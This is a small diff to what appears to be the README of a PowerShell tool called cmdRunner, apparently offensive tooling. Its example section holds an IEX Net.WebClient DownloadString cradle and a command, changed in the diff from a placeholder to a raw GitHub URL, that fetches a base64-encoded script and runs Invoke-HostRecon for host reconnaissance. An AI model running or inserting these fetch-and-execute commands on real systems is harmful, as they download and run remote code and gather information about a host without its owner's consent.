@@ -6,4 +6,4 @@ cmdRunner -Uri http://your-server/path/to/b64/encoded/powershell/script.txt -Com
 
 ## Example
 IEX ((New-Object Net.WebClient).DownloadString(''))
-cmdRunner -Uri <URL> -Command Invoke-HostRecon
+cmdRunner -Uri https://raw.githubusercontent.com/nullg0re/cmdRunner/main/HostRecon.b64.txt -Command Invoke-HostRecon
